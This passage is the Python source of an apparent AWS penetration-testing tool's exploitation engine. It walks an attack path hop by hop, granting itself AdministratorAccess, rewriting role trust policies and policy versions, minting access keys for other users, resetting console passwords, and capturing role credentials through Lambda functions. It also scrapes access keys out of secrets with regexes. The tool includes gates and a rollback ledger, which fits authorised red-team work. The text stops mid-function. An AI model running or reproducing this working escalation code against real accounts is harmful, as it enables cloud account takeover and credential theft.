"""Exploitation engine - the phase-3 `pwn` core.

Walks a discovered `AttackPath` edge by edge, executing each hop IN-PROCESS via
boto3 with real credential propagation: an identity-changing hop (assume-role,
minted access key, a Lambda that returns its execution-role creds, a secret that
holds an access key) yields a NEW `AwsClient` that subsequent hops act as - the
AWS analogue of ADPwn rewriting ATTACKER_NAME/PASS between hops.

What makes this different from the smaller `exploit.py` bridge:
  * every mutating call is recorded on the `Mutation` ledger with a concrete undo,
    persisted to state.json, so `awspwn rollback` can unwind the whole run;
  * a `BlastRadius` gate (`--execute` / `--allow-destructive` / `--allow-external`
    / `--allow-orphan`) is enforced per hop before anything mutates;
  * data-read hops capture credential material out of secrets/parameters and
    propagate it;
  * a fallback chain: when a hop toward the admin goal is blocked or fails, the
    engine tries sibling edges that reach the same target before giving up.

Design contract (see AWSPwn/CLAUDE.md): the graph edge `A --[Kind]--> B` means
"as A, act to gain B". Self-escalation edges point at the synthetic per-account
`admin` goal node; their strategies operate on the CURRENT principal, not on the
(abstract) target. Everything reuses the proven handlers in `exploit.py` rather
than reimplementing credential capture.
"""

from __future__ import annotations

import json
import os
import re
import urllib.request
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable, Optional

from .abuse import format_command, get_abuse_info
from .aws_client import (
    AwsClient,
    RetryPolicy,
    retry_until_consistent,
)
from .colors import C, _bold, _color, _dim
from .exploit import _handle_create_lambda  # proven Lambda-as-role cred capture
from .graph import AttackGraph
from .models import (
    AbuseInfo,
    AttackPath,
    AwsIdentity,
    BlastRadius,
    Edge,
    Mutation,
    Node,
    NodeKind,
)
from .state import (
    State,
    find_captured_cred,
    loot_dir_path,
    save_captured_cred,
    save_state,
    secure_mkdir,
)

ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"
_INLINE_ADMIN_DOC = {
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}],
}

# Identity hops handled by sts:AssumeRole (in-process credential propagation).
ASSUME_EDGES = {
    "CanAssume",
    "AssumeRoleCrossAccount",
    "AssumeRoleCrossAccountOrg",
    "OrgManagementAccountAccess",
}

_BLAST_COLOR = {
    BlastRadius.READ: C.GREEN,
    BlastRadius.MUTATE: C.YELLOW,
    BlastRadius.DESTRUCTIVE: C.RED,
    BlastRadius.EXTERNAL_EXPOSURE: C.MAGENTA,
}

# Access-key / secret patterns for pulling creds out of read edges.
_AKID_RE = re.compile(r"(AKIA|ASIA)[0-9A-Z]{16}")
_SECRET_RE = re.compile(r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])")
_CRED_JSON_KEYS = {
    "access_key": ("aws_access_key_id", "accesskeyid", "access_key_id", "access_key", "aws_access_key"),
    "secret_key": ("aws_secret_access_key", "secretaccesskey", "secret_access_key", "secret_key", "aws_secret_key"),
    "session_token": ("aws_session_token", "sessiontoken", "session_token", "security_token"),
}


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ─── Safety gates ───────────────────────────────────────────────────────────


@dataclass
class Gates:
    """Blast-radius execution gates. Read-only steps always pass; mutating steps
    require `--execute`, and the two most dangerous classes require an extra,
    explicit opt-in each. `allow_orphan` lets a mutating step run when its undo
    cannot be recorded on the ledger."""

    execute: bool = False
    allow_destructive: bool = False
    allow_external: bool = False
    allow_orphan: bool = False

    def permits(self, blast: BlastRadius) -> tuple[bool, str]:
        if blast == BlastRadius.READ:
            return True, ""
        if not self.execute:
            return False, "plan mode - pass --execute to run mutating steps"
        if blast == BlastRadius.DESTRUCTIVE and not self.allow_destructive:
            return False, "DESTRUCTIVE - pass --allow-destructive"
        if blast == BlastRadius.EXTERNAL_EXPOSURE and not self.allow_external:
            return False, "EXTERNAL_EXPOSURE - pass --allow-external"
        return True, ""


# ─── Per-step result ────────────────────────────────────────────────────────


@dataclass
class StepResult:
    ok: bool
    new_client: Optional[AwsClient] = None      # identity changed / creds captured
    note: str = ""
    manual: bool = False                        # printed for the operator, not run
    reached_goal: bool = False
    captured: list[AwsIdentity] = field(default_factory=list)
    loot: list[str] = field(default_factory=list)  # redacted descriptions of read data


@dataclass
class WalkReport:
    reached_goal: bool = False
    hops_total: int = 0
    hops_done: int = 0
    final_arn: str = ""
    mutations: int = 0
    blocked: list[str] = field(default_factory=list)
    manual: list[str] = field(default_factory=list)
    captured: list[AwsIdentity] = field(default_factory=list)
    loot: list[str] = field(default_factory=list)
    stopped_reason: str = ""


# ─── Engine ─────────────────────────────────────────────────────────────────


class PwnEngine:
    """Drives an AttackPath to completion with credential propagation, a mutation
    ledger, blast-radius gating, and a fallback chain."""

    def __init__(
        self,
        state: State,
        graph: AttackGraph,
        gates: Gates,
        *,
        account: str = "",
        region: str = "us-east-1",
        loot_dir: Optional[str] = None,
        session_name: str = "awspwn",
        log: Optional[Callable[[str], None]] = None,
    ):
        self.state = state
        self.graph = graph
        self.gates = gates
        self.account = account
        self.region = region or "us-east-1"
        self.loot_dir = loot_dir
        self.session_name = session_name
        self.log = log or (lambda _m: print(_m))
        self.mutation_count = 0
        # The furthest-propagated identity the walk reaches. After a successful
        # escalation this is usually more privileged than the caller, so it can
        # undo artifacts the caller lacks permission to delete (the create-not-
        # delete case). `awspwn pwn --cleanup` rolls back through it.
        self.final_client = None

    # ── ledger ──────────────────────────────────────────────────────────────

    def record_mutation(
        self,
        api: str,
        params: dict,
        principal_used: str,
        blast: BlastRadius,
        *,
        undo_api: str = "",
        undo_params: Optional[dict] = None,
        original_state: Optional[dict] = None,
        note: str = "",
        reverted: bool = False,
    ) -> Mutation:
        m = Mutation(
            ts=_now_iso(),
            api=api,
            params=params,
            principal_used=principal_used,
            blast_radius=blast.value,
            undo_api=undo_api,
            undo_params=undo_params or {},
            original_state=original_state,
            reverted=reverted,
            note=note,
        )
        self.state.record_mutation(m)
        save_state(self.state, self.loot_dir)
        if not reverted:
            self.mutation_count += 1
        return m

    def guarded_mutation(self, call: Callable, **mutation_kwargs):
        """Record the mutation on the ledger BEFORE issuing the AWS call, then
        call. If the call fails cleanly (raises), drop the just-recorded entry
        (the change never happened). This closes the window where a process kill
        between a successful mutating call and the ledger write would leave an
        un-undoable change - the ledger is written first, so a crash still leaves
        a recorded (and thus rollback-able) mutation. Use for edges whose full
        undo is known before the call; edges that need a runtime-generated id
        (CreateAccessKey, CreatePolicyVersion) record after, unavoidably."""
        m = self.record_mutation(**mutation_kwargs)
        try:
            return call()
        except Exception:
            try:
                self.state.mutations.remove(m)
                if not mutation_kwargs.get("reverted"):
                    self.mutation_count -= 1
                save_state(self.state, self.loot_dir)
            except ValueError:  # already removed - leave it
                pass
            raise

    def orphan_ok(self) -> bool:
        return self.gates.allow_orphan

    # ── captured-credential store (owner-only loot) ──────────────────────────

    def save_captured(self, kind: str, target: Node, ident: AwsIdentity, note: str = "") -> None:
        """Persist a created/captured credential to the 0600 loot store so a
        mid-run failure never orphans it and the next run can reuse it."""
        save_captured_cred({
            "ts": _now_iso(),
            "kind": kind,
            "account": ident.account or self.account,
            "target_arn": target.object_id,
            "target_name": target.name,
            "arn": ident.arn,
            "access_key": ident.access_key,
            "secret_key": ident.secret_key,
            "session_token": ident.session_token,
            "expiration": ident.expiration,
            "source": ident.source,
            "note": note,
        }, self.loot_dir)

    def find_captured(self, kind: str, target_arn: str) -> Optional[dict]:
        return find_captured_cred(self.loot_dir, kind, target_arn)

    @staticmethod
    def _client_from_stored(entry: dict) -> AwsClient:
        return AwsClient(AwsIdentity(
            access_key=entry.get("access_key", ""),
            secret_key=entry.get("secret_key", ""),
            session_token=entry.get("session_token", ""),
            arn=entry.get("arn", "") or entry.get("target_arn", ""),
            account=(entry.get("target_arn", "").split(":")[4] if ":" in entry.get("target_arn", "") else ""),
            region=entry.get("region", "") or "us-east-1",
            expiration=entry.get("expiration", ""),
            source=entry.get("source", "") + "(reused)",
        ))

    # ── context ─────────────────────────────────────────────────────────────

    def context(self, client: AwsClient, src: Node, dst: Node) -> dict:
        ident = client.identity
        ctx = {
            "AWS_AUTH": "",  # in-process execution uses the client, not the CLI
            # Prefer the LIVE identity's account: after a cross-account pivot the
            # engine's origin account is stale, and templates must target the
            # account the current credentials actually belong to.
            "ACCOUNT_ID": ident.account or self.account,
            # Regional resources (secret/param/bucket) carry their own region on
            # the node; principals have none, so this falls back to the engine
            # region. Reading a us-east-1 client against a eu-west-1 secret ARN
            # just 404s, so bind to the resource's region.
            "REGION": dst.region or self.region,
            "SESSION_NAME": self.session_name,
            "FUNCTION_NAME": f"awspwn-exploit-{uuid.uuid4().hex[:8]}",
            "POLICY_NAME": "awspwn-esc",
            "NEW_ROLE_NAME": "awspwn-role",
            "NEW_USER": "awspwn-bd",
            "NEW_PASSWORD": "Awspwn-Pw1!x",
            "PRINCIPAL_ARN": ident.arn,
            "PRINCIPAL_NAME": ident.name,
            "TARGET_ARN": dst.object_id,
            "TARGET_NAME": dst.name,
            "TARGET_TYPE": dst.kind.value,
        }
        if dst.kind == NodeKind.IAM_ROLE:
            ctx["ROLE_ARN"] = dst.object_id
            ctx["ROLE_NAME"] = dst.name
        if dst.kind == NodeKind.SECRET:
            ctx["SECRET_ID"] = dst.object_id or dst.name
        if dst.kind == NodeKind.SSM_PARAMETER:
            ctx["PARAM_NAME"] = dst.name
        if dst.kind == NodeKind.S3_BUCKET:
            ctx["BUCKET"] = dst.name
        return ctx

    # ── walk ─────────────────────────────────────────────────────────────────

    def walk(self, path: AttackPath, start_client: AwsClient) -> WalkReport:
        report = WalkReport(hops_total=path.length, final_arn=start_client.identity.arn)
        current = start_client

        for i, edge in enumerate(path.edges):
            src_node = path.nodes[i]
            dst_node = path.nodes[i + 1]
            info = get_abuse_info(edge.kind)
            blast = info.blast_radius if info else BlastRadius.READ
            tag = _color(blast.value, _BLAST_COLOR.get(blast, C.WHITE))
            self.log(_color(f"\n  ── hop {i + 1}/{path.length}: {edge.kind} → {dst_node.label}  [{tag}]", C.CYAN))

            res = self._run_hop(current, edge, src_node, dst_node, info, blast)

            # Fallback: on block/failure toward this target, try sibling edges.
            if not res.ok and not res.manual:
                alt = self._fallback(current, src_node, dst_node, tried={edge.kind})
                if alt is not None:
                    res = alt

            if res.manual:
                report.manual.append(f"{edge.kind} → {dst_node.label}: {res.note}")
                self.log(_color(f"  [manual] {res.note}", C.YELLOW))
            report.captured.extend(res.captured)
            report.loot.extend(res.loot)

            if res.new_client is not None:
                current = res.new_client
                report.final_arn = current.identity.arn
                self.log(f"  {_color('[+]', C.GREEN)} now: {_bold(current.identity.arn)}")

            if res.reached_goal:
                report.reached_goal = True

            if not res.ok:
                if res.manual:
                    report.stopped_reason = "manual step required - cannot continue automatically"
                else:
                    report.blocked.append(f"{edge.kind} → {dst_node.label}: {res.note}")
                    report.stopped_reason = res.note
                self.log(_color(f"  [!] stopping: {res.note}", C.YELLOW))
                report.mutations = self.mutation_count
                self.final_client = current
                return report

            report.hops_done += 1

        report.reached_goal = report.reached_goal or (report.hops_done == path.length)
        report.mutations = self.mutation_count
        self.final_client = current
        return report

    def _run_hop(
        self, client: AwsClient, edge: Edge, src: Node, dst: Node,
        info: Optional[AbuseInfo], blast: BlastRadius,
    ) -> StepResult:
        permitted, reason = self.gates.permits(blast)
        if not permitted:
            return StepResult(ok=False, note=reason)
        strat = STRATEGIES.get(edge.kind, _strat_default)
        ctx = self.context(client, src, dst)
        try:
            return strat(self, client, edge, src, dst, ctx)
        except Exception as exc:  # noqa: BLE001 - a failed hop is data, try fallback
            return StepResult(ok=False, note=f"{type(exc).__name__}: {exc}")

    def _fallback(self, client: AwsClient, src: Node, dst: Node, tried: set) -> Optional[StepResult]:
        """Try alternative edges from `src` that reach the same target `dst`."""
        for edge in self.graph.outgoing_edges(src.object_id):
            if edge.target_id != dst.object_id or edge.kind in tried:
                continue
            info = get_abuse_info(edge.kind)
            if info is None or not info.is_abusable:
                continue
            tried.add(edge.kind)
            permitted, _reason = self.gates.permits(info.blast_radius)
            if not permitted:
                continue
            self.log(_dim(f"  ↳ fallback: trying {edge.kind}"))
            res = self._run_hop(client, edge, src, dst, info, info.blast_radius)
            if res.ok:
                return res
        return None


# ─── Credential extraction (data edges) ─────────────────────────────────────


def _extract_aws_creds(text: str) -> Optional[dict]:
    """Pull an access-key/secret (and optional token) out of a secret value -
    JSON first, then loose regex. Returns None if no plausible pair is found."""
    if not text:
        return None
    # JSON object with recognisable key names.
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            flat = {str(k).lower().replace("-", "_"): v for k, v in obj.items()}
            found = {}
            for field_name, aliases in _CRED_JSON_KEYS.items():
                for a in aliases:
                    if a in flat and isinstance(flat[a], str) and flat[a]:
                        found[field_name] = flat[a]
                        break
            if "access_key" in found and "secret_key" in found:
                return {
                    "access_key": found["access_key"],
                    "secret_key": found["secret_key"],
                    "session_token": found.get("session_token", ""),
                }
    except (ValueError, TypeError):
        pass
    # Loose: an access-key id plus a nearby 40-char secret.
    akid = _AKID_RE.search(text)
    sec = _SECRET_RE.search(text)
    if akid and sec:
        return {"access_key": akid.group(0), "secret_key": sec.group(0), "session_token": ""}
    return None


def _client_from_creds(creds: dict, ctx: dict, source: str) -> AwsClient:
    ident = AwsIdentity(
        access_key=creds["access_key"],
        secret_key=creds["secret_key"],
        session_token=creds.get("session_token", ""),
        account=ctx.get("ACCOUNT_ID", ""),
        region=ctx.get("REGION", "us-east-1"),
        source=source,
    )
    return AwsClient(ident)


def _verified_client(creds: dict, ctx: dict, source: str) -> Optional[AwsClient]:
    """Build a client from extracted creds and return it ONLY if it actually
    authenticates (sts:GetCallerIdentity resolves). Returns None otherwise, so a
    false-positive regex match or a rotated/expired embedded key never replaces
    the working identity with a dead one. Its arn is filled from whoami."""
    candidate = _client_from_creds(creds, ctx, source)
    try:
        candidate.whoami()
    except Exception:  # noqa: BLE001 - unusable creds: do not propagate
        return None
    return candidate


# ─── Strategies ──────────────────────────────────────────────────────────────
# Signature: (engine, client, edge, src, dst, ctx) -> StepResult
# `blast` gating already happened in _run_hop; strategies that mutate WITHOUT a
# recordable undo must additionally check engine.orphan_ok().


def _strat_effective_admin(engine, client, edge, src, dst, ctx) -> StepResult:
    return StepResult(ok=True, reached_goal=True,
                      note=f"{client.identity.arn} holds AdministratorAccess - game over")


def _strat_assume(engine, client, edge, src, dst, ctx) -> StepResult:
    external_id = edge.properties.get("external_id", "") or ctx.get("EXTERNAL_ID", "")
    new = client.assume_role(dst.object_id, session_name=engine.session_name, external_id=external_id)
    new.whoami()
    return StepResult(ok=True, new_client=new,
                      reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"assumed {dst.object_id}")


def _principal_user_name(identity: AwsIdentity) -> Optional[str]:
    """The IAM user name for a user identity, else None (roles cannot be a
    target of iam:*UserPolicy)."""
    arn = identity.arn
    if ":user/" in arn:
        return arn.split(":user/", 1)[1]
    return None


_NOT_A_USER = "current identity is a role, not an IAM user - user-policy self-escalation N/A here"


def _strat_attach_user_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    """Self-escalation: attach AdministratorAccess to the current IAM user."""
    user = _principal_user_name(client.identity)
    if user is None:
        return StepResult(ok=False, manual=True, note=_NOT_A_USER)
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.attach_user_policy(UserName=user, PolicyArn=ADMIN_POLICY_ARN),
        api="iam:AttachUserPolicy", params={"UserName": user, "PolicyArn": ADMIN_POLICY_ARN},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DetachUserPolicy",
        undo_params={"UserName": user, "PolicyArn": ADMIN_POLICY_ARN},
        note="self-escalation to admin",
    )
    _verify_admin(engine, client)
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"attached AdministratorAccess to user {user}")


def _strat_put_user_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    user = _principal_user_name(client.identity)
    if user is None:
        return StepResult(ok=False, manual=True, note=_NOT_A_USER)
    pol = ctx["POLICY_NAME"]
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.put_user_policy(UserName=user, PolicyName=pol,
                                    PolicyDocument=json.dumps(_INLINE_ADMIN_DOC)),
        api="iam:PutUserPolicy", params={"UserName": user, "PolicyName": pol},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DeleteUserPolicy",
        undo_params={"UserName": user, "PolicyName": pol},
        note="inline admin policy on self",
    )
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"wrote inline admin policy '{pol}' on user {user}")


def _strat_attach_group_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    group = edge.properties.get("via_group") or dst.name
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.attach_group_policy(GroupName=group, PolicyArn=ADMIN_POLICY_ARN),
        api="iam:AttachGroupPolicy", params={"GroupName": group, "PolicyArn": ADMIN_POLICY_ARN},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DetachGroupPolicy",
        undo_params={"GroupName": group, "PolicyArn": ADMIN_POLICY_ARN},
        note="admin via group membership (collateral: escalates all members)",
    )
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"attached AdministratorAccess to group {group}")


def _strat_put_group_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    group = edge.properties.get("via_group") or dst.name
    pol = ctx["POLICY_NAME"]
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.put_group_policy(GroupName=group, PolicyName=pol,
                                     PolicyDocument=json.dumps(_INLINE_ADMIN_DOC)),
        api="iam:PutGroupPolicy", params={"GroupName": group, "PolicyName": pol},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DeleteGroupPolicy",
        undo_params={"GroupName": group, "PolicyName": pol},
        note="inline admin on group (collateral: escalates all members)",
    )
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"wrote inline admin policy on group {group}")


def _strat_add_user_to_group(engine, client, edge, src, dst, ctx) -> StepResult:
    user = _principal_user_name(client.identity)
    if user is None:
        return StepResult(ok=False, manual=True, note=_NOT_A_USER)
    group = dst.name
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.add_user_to_group(GroupName=group, UserName=user),
        api="iam:AddUserToGroup", params={"GroupName": group, "UserName": user},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:RemoveUserFromGroup",
        undo_params={"GroupName": group, "UserName": user},
        note="joined privileged group",
    )
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"added {user} to group {group}")


def _strat_attach_role_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    """Escalate a role you can reach, then assume it."""
    role = ctx.get("ROLE_NAME") or dst.name
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.attach_role_policy(RoleName=role, PolicyArn=ADMIN_POLICY_ARN),
        api="iam:AttachRolePolicy", params={"RoleName": role, "PolicyArn": ADMIN_POLICY_ARN},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DetachRolePolicy",
        undo_params={"RoleName": role, "PolicyArn": ADMIN_POLICY_ARN},
        note="granted admin to a reachable role",
    )
    new = _assume_with_propagation(engine, client, dst.object_id)
    return StepResult(ok=True, new_client=new,
                      note=f"attached admin to role {role} and assumed it")


def _strat_put_role_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    role = ctx.get("ROLE_NAME") or dst.name
    pol = ctx["POLICY_NAME"]
    iam = client.client("iam")
    engine.guarded_mutation(
        lambda: iam.put_role_policy(RoleName=role, PolicyName=pol,
                                    PolicyDocument=json.dumps(_INLINE_ADMIN_DOC)),
        api="iam:PutRolePolicy", params={"RoleName": role, "PolicyName": pol},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DeleteRolePolicy",
        undo_params={"RoleName": role, "PolicyName": pol},
        note="inline admin on a reachable role",
    )
    new = _assume_with_propagation(engine, client, dst.object_id)
    return StepResult(ok=True, new_client=new,
                      note=f"wrote inline admin on role {role} and assumed it")


def _strat_update_assume_role_policy(engine, client, edge, src, dst, ctx) -> StepResult:
    """Rewrite a role's trust to allow the current principal, then assume it.
    Captures the original trust document so rollback restores it exactly."""
    role = ctx.get("ROLE_NAME") or dst.name
    iam = client.client("iam")
    original = iam.get_role(RoleName=role)["Role"]["AssumeRolePolicyDocument"]
    new_trust = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": client.identity.arn},
            "Action": "sts:AssumeRole",
        }],
    }
    # Record the undo (which carries the captured original trust doc) BEFORE the
    # overwrite: UpdateAssumeRolePolicy replaces the document, so a crash between
    # the call and the record would lose the only copy of the original. guarded_
    # mutation records first and drops the entry only if the overwrite itself
    # fails cleanly.
    engine.guarded_mutation(
        lambda: iam.update_assume_role_policy(RoleName=role, PolicyDocument=json.dumps(new_trust)),
        api="iam:UpdateAssumeRolePolicy", params={"RoleName": role, "PolicyDocument": new_trust},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:UpdateAssumeRolePolicy",
        undo_params={"RoleName": role, "PolicyDocument": json.dumps(original)},
        original_state={"AssumeRolePolicyDocument": original},
        note="overwrote role trust to allow self (original captured for rollback)",
    )
    new = _assume_with_propagation(engine, client, dst.object_id)
    return StepResult(ok=True, new_client=new,
                      note=f"rewrote trust on {role} and assumed it")


def _strat_create_policy_version(engine, client, edge, src, dst, ctx) -> StepResult:
    """Rewrite a customer-managed policy attached to the current principal to an
    admin grant, set as default. Rollback restores the prior default + deletes
    the version we created."""
    # Prefer the exact policy ARN that permission evaluation approved for this
    # edge (mint-time `via_policy`); fall back to picking one off the node only
    # when the edge predates that. Picking the first attachment blindly can target
    # a policy the principal is NOT allowed to rewrite.
    pol_arn = edge.properties.get("via_policy") or _pick_customer_managed(src)
    if not pol_arn:
        return StepResult(ok=False, manual=True,
                          note="no customer-managed policy on the principal to rewrite")
    iam = client.client("iam")
    original_default = iam.get_policy(PolicyArn=pol_arn)["Policy"]["DefaultVersionId"]
    ver = iam.create_policy_version(
        PolicyArn=pol_arn, PolicyDocument=json.dumps(_INLINE_ADMIN_DOC), SetAsDefault=True
    )["PolicyVersion"]["VersionId"]
    # One API call, two reversible effects - record them as two ledger entries so
    # LIFO rollback restores the prior default FIRST, then deletes the version we
    # created (a policy's current default version cannot be deleted).
    engine.record_mutation(
        "iam:CreatePolicyVersion", {"PolicyArn": pol_arn, "VersionId": ver},
        client.identity.arn, BlastRadius.MUTATE,
        undo_api="iam:DeletePolicyVersion",
        undo_params={"PolicyArn": pol_arn, "VersionId": ver},
        note="created admin policy version",
    )
    engine.record_mutation(
        "iam:SetDefaultPolicyVersion", {"PolicyArn": pol_arn, "VersionId": ver},
        client.identity.arn, BlastRadius.MUTATE,
        undo_api="iam:SetDefaultPolicyVersion",
        undo_params={"PolicyArn": pol_arn, "VersionId": original_default},
        original_state={"DefaultVersionId": original_default},
        note="set the admin version as default (rollback restores the prior default)",
    )
    return StepResult(ok=True, reached_goal=bool(dst.properties.get("synthetic_goal")),
                      note=f"rewrote {pol_arn} to admin (v{ver})")


def _strat_create_role_and_assume(engine, client, edge, src, dst, ctx) -> StepResult:
    role = ctx["NEW_ROLE_NAME"]
    iam = client.client("iam")
    trust = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": client.identity.arn},
            "Action": "sts:AssumeRole",
        }],
    }
    engine.guarded_mutation(
        lambda: iam.create_role(RoleName=role, AssumeRolePolicyDocument=json.dumps(trust)),
        api="iam:CreateRole", params={"RoleName": role},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DeleteRole", undo_params={"RoleName": role},
        note="created attacker-controlled role",
    )
    engine.guarded_mutation(
        lambda: iam.attach_role_policy(RoleName=role, PolicyArn=ADMIN_POLICY_ARN),
        api="iam:AttachRolePolicy", params={"RoleName": role, "PolicyArn": ADMIN_POLICY_ARN},
        principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
        undo_api="iam:DetachRolePolicy",
        undo_params={"RoleName": role, "PolicyArn": ADMIN_POLICY_ARN},
        note="granted admin to the new role",
    )
    role_arn = f"arn:aws:iam::{ctx['ACCOUNT_ID']}:role/{role}"
    new = _assume_with_propagation(engine, client, role_arn)
    return StepResult(ok=True, new_client=new, reached_goal=True,
                      note=f"created + assumed admin role {role}")


def _strat_create_access_key(engine, client, edge, src, dst, ctx) -> StepResult:
    """Mint an access key for the target user and become them. Reuses a
    previously-stored key for this user (resume-safe: avoids the 2-key-per-user
    cap and re-minting a duplicate on a retry)."""
    user = dst.name

    prior = engine.find_captured("access_key", dst.object_id)
    if prior and prior.get("access_key") and prior.get("secret_key"):
        reused = engine._client_from_stored(prior)
        try:
            reused.whoami()
            engine.log(f"    {_color('[+]', C.GREEN)} reusing stored access key "
                       f"{prior['access_key']} for {user}")
            return StepResult(ok=True, new_client=reused, captured=[reused.identity],
                              note=f"reused stored access key for {user}")
        except Exception:  # noqa: BLE001 - stored key no longer valid; mint a fresh one
            engine.log(_dim(f"    stored key for {user} no longer valid - minting a fresh one"))

    iam = client.client("iam")
    key = iam.create_access_key(UserName=user)["AccessKey"]
    engine.record_mutation(
        "iam:CreateAccessKey", {"UserName": user, "AccessKeyId": key["AccessKeyId"]},
        client.identity.arn, BlastRadius.MUTATE,
        undo_api="iam:DeleteAccessKey",
        undo_params={"UserName": user, "AccessKeyId": key["AccessKeyId"]},
        note="minted access key for lateral identity",
    )
    ident = AwsIdentity(
        access_key=key["AccessKeyId"], secret_key=key["SecretAccessKey"],
        arn=dst.object_id, account=ctx["ACCOUNT_ID"], region=ctx["REGION"],
        source="create-access-key",
    )
    # Persist BEFORE propagating: if a later hop fails, the key is still in the
    # loot store (and reused next run) rather than orphaned with its secret lost.
    engine.save_captured("access_key", dst, ident, note="minted for lateral identity")
    engine.log(f"    {_color('[+]', C.GREEN)} saved access key {key['AccessKeyId']} for {user} to loot")
    new = AwsClient(ident)
    retry_until_consistent(new.whoami, treat_access_denied_as_transient=True,
                           policy=RetryPolicy(max_wait=20, base=2))
    return StepResult(ok=True, new_client=new, captured=[ident],
                      note=f"became user {user} via new access key")


def _strat_login_profile(engine, client, edge, src, dst, ctx) -> StepResult:
    """Set/reset a console password on the target user. Grants console (not CLI)
    access - no credential propagation; point the operator at `awspwn console`."""
    user = dst.name
    iam = client.client("iam")
    update = edge.kind == "UpdateLoginProfile"
    if update:
        # There is no way to restore the prior password; undo can only delete the
        # profile, so this is an orphan-ish mutation - gate BEFORE calling AWS.
        if not engine.orphan_ok():
            return StepResult(ok=False, note="UpdateLoginProfile is not cleanly reversible - pass --allow-orphan")
        engine.guarded_mutation(
            lambda: iam.update_login_profile(UserName=user, Password=ctx["NEW_PASSWORD"],
                                             PasswordResetRequired=False),
            api="iam:UpdateLoginProfile", params={"UserName": user},
            principal_used=client.identity.arn, blast=BlastRadius.DESTRUCTIVE,
            undo_api="iam:DeleteLoginProfile", undo_params={"UserName": user},
            note="reset console password (original NOT recoverable; undo deletes the profile)",
        )
    else:
        engine.guarded_mutation(
            lambda: iam.create_login_profile(UserName=user, Password=ctx["NEW_PASSWORD"],
                                             PasswordResetRequired=False),
            api="iam:CreateLoginProfile", params={"UserName": user},
            principal_used=client.identity.arn, blast=BlastRadius.MUTATE,
            undo_api="iam:DeleteLoginProfile", undo_params={"UserName": user},
            note="added console password",
        )
    return StepResult(ok=True, note=f"console password set on {user} - sign in via `awspwn console`",
                      loot=[f"console:{user}"])


def _strat_create_lambda(engine, client, edge, src, dst, ctx) -> StepResult:
    """Deploy a function running AS the target role, read its creds, propagate.
    Reuses exploit.py's proven handler, which self-deletes the function."""
    prior = engine.find_captured("role-creds", dst.object_id)
    if prior and prior.get("access_key"):
        reused = engine._client_from_stored(prior)
        try:
            reused.whoami()
            engine.log(f"    {_color('[+]', C.GREEN)} reusing stored session creds for {dst.label}")
            return StepResult(ok=True, new_client=reused, captured=[reused.identity],
                              note=f"reused stored creds for {dst.label}")
        except Exception:  # noqa: BLE001 - stored session creds expired; re-capture below
            engine.log(_dim(f"    stored creds for {dst.label} expired - re-capturing"))

    new = _handle_create_lambda(client, dst, ctx, log=lambda m: engine.log(f"    {m}"))
    # The helper attempts to self-delete the function, but that delete can fail
    # (leaving a privileged function behind). Record the mutation as LIVE with a
    # DeleteFunction undo: rollback treats an already-deleted function as
    # NOT_FOUND (a harmless no-op) and actually removes one the helper couldn't.
    engine.record_mutation(
        "lambda:CreateFunction", {"FunctionName": ctx["FUNCTION_NAME"], "Role": dst.object_id},
        client.identity.arn, BlastRadius.MUTATE,
        undo_api="lambda:DeleteFunction",
        undo_params={"FunctionName": ctx["FUNCTION_NAME"], "_region": ctx["REGION"]},
        reverted=False,
        note="lambda-as-role cred capture (helper self-deletes; rollback re-confirms removal)",
    )
    if new is None:
        return StepResult(ok=False, note="lambda-as-role capture did not complete (see log)")
    engine.save_captured("role-creds", dst, new.identity, note="captured via Lambda-as-role")
    return StepResult(ok=True, new_client=new, captured=[new.identity],
                      note=f"captured {dst.object_id} creds via Lambda")


# ─── Existing-Lambda takeover (credential-gain via UpdateFunctionCode) ────────


def _role_name_account(role_arn: str) -> tuple[str, str]:
    name = role_arn.rsplit("/", 1)[-1]
    account = role_arn.split(":")[4] if role_arn.count(":") >= 4 else ""
    return name, account


def _sts_role_name_account(sts_arn: str) -> tuple[str, str]:
    """(role_name, account) from an STS assumed-role ARN. Role NAMES are
    account-unique, so this is enough to verify identity without a GetRole."""
